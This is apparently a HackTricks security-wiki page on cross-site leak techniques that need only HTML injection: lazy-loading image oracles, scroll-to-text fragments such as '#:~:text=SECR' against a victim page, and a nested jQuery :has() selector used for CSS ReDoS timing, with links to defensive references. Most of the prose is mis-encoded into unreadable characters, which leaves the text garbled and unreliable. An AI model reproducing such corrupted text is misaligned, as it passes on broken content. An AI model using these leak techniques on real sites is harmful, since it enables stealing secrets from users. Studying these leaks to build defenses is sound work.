[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## With HTML or Re Injection

рдпрд╣рд╛рдБ рдЖрдк рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди HTML рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рддрдХрдиреАрдХреЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ **HTML рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдХреЗред рдпреЗ рддрдХрдиреАрдХреЗрдВ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИрдВ рдЬрд╣рд╛рдВ рдХрд┐рд╕реА рднреА рдХрд╛рд░рдг рд╕реЗ рдЖрдк **HTML рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**ред

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

рдпрджрд┐ рдЖрдкрдХреЛ **рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдЖрдк **рдЧреБрдкреНрдд рдХреЗ рдкрд╣рд▓реЗ HTML рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЛ **рд╕рд╛рдорд╛рдиреНрдп рд▓рдЯрдХрддреЗ рдорд╛рд░реНрдХрдЕрдк рддрдХрдиреАрдХреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред\
рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ рдХрд┐рд╕реА рднреА рдХрд╛рд░рдг рд╕реЗ рдЖрдкрдХреЛ **рдЪрд░ рджреНрд╡рд╛рд░рд╛ рдЪрд░** рдХрд░рдирд╛ **рдЕрдирд┐рд╡рд╛рд░реНрдп** рд╣реИ (рд╢рд╛рдпрдж рд╕рдВрдЪрд╛рд░ рдХреИрд╢ рд╣рд┐рдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИ) рддреЛ рдЖрдк рдЗрд╕ рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

HTML рдореЗрдВ **рдЫрд╡рд┐рдпреЛрдВ** рдореЗрдВ рдПрдХ "**loading**" рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рди "**lazy**" рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЫрд╡рд┐ рддрдм рд▓реЛрдб рд╣реЛрдЧреА рдЬрдм рдЗрд╕реЗ рджреЗрдЦрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдкреГрд╖реНрда рд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рджреМрд░рд╛рди рдирд╣реАрдВ:
```html
<img src=/something loading=lazy >
```
рдЗрд╕рд▓рд┐рдП, рдЖрдк рдЬреЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **рдХрдИ рдЬрдВрдХ рдХреИрд░реЗрдХреНрдЯрд░реНрд╕ рдЬреЛрдбрд╝рдирд╛** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рд╣рдЬрд╛рд░реЛрдВ "W"**) **рдЧреБрдкреНрдд рдХреЗ рдкрд╣рд▓реЗ рд╡реЗрдм рдкреЗрдЬ рдХреЛ рднрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ рдХреБрдЫ рдРрд╕рд╛ рдЬреЛрдбрд╝рдирд╛ рдЬреИрд╕реЗ** `<br><canvas height="1850px"></canvas><br>.`\
рдлрд┐рд░ рдпрджрд┐ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реА **рдЗрдВрдЬреЗрдХреНрд╢рди рдзреНрд╡рдЬ рдХреЗ рдкрд╣рд▓реЗ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ**, рддреЛ **рдЫрд╡рд┐** **рд▓реЛрдб** рд╣реЛрдЧреА, рд▓реЗрдХрд┐рди рдпрджрд┐ **рдзреНрд╡рдЬ рдХреЗ рдмрд╛рдж** рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ, рддреЛ рдзреНрд╡рдЬ + рдЬрдВрдХ **рдЗрд╕реЗ рд▓реЛрдб рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХ рджреЗрдЧрд╛** (рдЖрдкрдХреЛ рдпрд╣ рддрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЦреЗрд▓рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдХрд┐рддрдиреА рдЬрдВрдХ рдбрд╛рд▓рдиреА рд╣реИ)ред рдпрд╣реА [**рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) рд╣реБрдЖред

рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛрдЧрд╛ **рд╕реНрдХреНрд░реЙрд▓-рдЯреВ-рдЯреЗрдХреНрд╕реНрдЯ-рдлреНрд░реИрдЧрдореЗрдВрдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдпрджрд┐ рдЕрдиреБрдорддрд┐ рд╣реЛ: 

#### Scroll-to-text-fragment

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк **рдмреЙрдЯ рдХреЛ рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдБрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдРрд╕рд╛ рдХрд░рддреЗ рд╣реИрдВ
```
#:~:text=SECR
```
So the web page will be something like: **`https://victim.com/post.html#:~:text=SECR`**

рдЬрд╣рд╛рдБ post.html рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдЬрдВрдХ рдХреИрд░реЗрдХреНрдЯрд░реНрд╕ рдФрд░ рд▓реЗрдЬрд╝реА рд▓реЛрдб рдЗрдореЗрдЬ рд╣реЛрддреА рд╣реИ рдФрд░ рдлрд┐рд░ рдмреЙрдЯ рдХрд╛ рд░рд╣рд╕реНрдп рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рдЯреЗрдХреНрд╕реНрдЯ рдмреЙрдЯ рдХреЛ рдкреЗрдЬ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЯреЗрдХреНрд╕реНрдЯ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдПрдЧрд╛ рдЬреЛ рдЯреЗрдХреНрд╕реНрдЯ `SECR` рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рд╡рд╣ рдЯреЗрдХреНрд╕реНрдЯ рд░рд╣рд╕реНрдп рд╣реИ рдФрд░ рдпрд╣ **рдЗрдореЗрдЬ рдХреЗ рдареАрдХ рдиреАрдЪреЗ** рд╣реИ, **рдЗрдореЗрдЬ рдХреЗрд╡рд▓ рддрднреА рд▓реЛрдб рд╣реЛрдЧреА рдЬрдм рдЕрдиреБрдорд╛рдирд┐рдд рд░рд╣рд╕реНрдп рд╕рд╣реА рд╣реЛрдЧрд╛**ред рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд░рд╣рд╕реНрдп рдХреЛ рдХреИрд░реЗрдХреНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдХреИрд░реЗрдХреНрдЯрд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХрд╛ рдУрд░реЗрдХрд▓ рд╣реИ**ред

Some code example to exploit this: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Image Lazy Loading Time Based

рдпрджрд┐ **рдмрд╛рд╣рд░реА рдЗрдореЗрдЬ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ** рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХреЗ рдХрд┐ рдЗрдореЗрдЬ рд▓реЛрдб рд╣реЛ рдЧрдИ рд╣реИ, рддреЛ рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛрдЧрд╛ рдХрд┐ **рдХрдИ рдмрд╛рд░ рдХреИрд░реЗрдХреНрдЯрд░ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдорд╛рдкреЗрдВ**ред рдпрджрд┐ рдЗрдореЗрдЬ рд▓реЛрдб рд╣реЛрддреА рд╣реИ рддреЛ рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рдЕрдзрд┐рдХ рд╕рдордп рд▓рдЧреЗрдЧрд╛ рдмрдирд┐рд╕реНрдмрдд рдЗрд╕рдХреЗ рдХрд┐ рдЗрдореЗрдЬ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддреАред рдпрд╣реА [**рдЗрд╕ рд▓реЗрдЦ рдХреЗ рд╕рдорд╛рдзрд╛рди рдореЗрдВ**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

рдпрджрд┐ `jQuery(location.hash)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рдордп рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ **рдпрджрд┐ рдХреБрдЫ HTML рд╕рд╛рдордЧреНрд░реА рдореМрдЬреВрдж рд╣реИ**, рдпрд╣ рдЗрд╕ рдХрд╛рд░рдг рд╕реЗ рд╣реИ рдХрд┐ рдпрджрд┐ рдЪрдпрдирдХрд░реНрддрд╛ `main[id='site-main']` рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рдмрд╛рдХреА **рдЪрдпрдирдХрд░реНрддрд╛рдУрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defenses

рдЗрди рддрдХрдиреАрдХреЛрдВ рд╕реЗ рдмрдЪрд╛рд╡ рдХреЗ рд▓рд┐рдП [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) рдореЗрдВ рдЕрдиреБрд╢рдВрд╕рд┐рдд рдЙрдкрд╛рдп рд╣реИрдВ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ [https://xsleaks.dev/](https://xsleaks.dev/) рдкрд░ рднреАред рдЗрди рддрдХрдиреАрдХреЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд╡рд╣рд╛рдВ рджреЗрдЦреЗрдВред

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
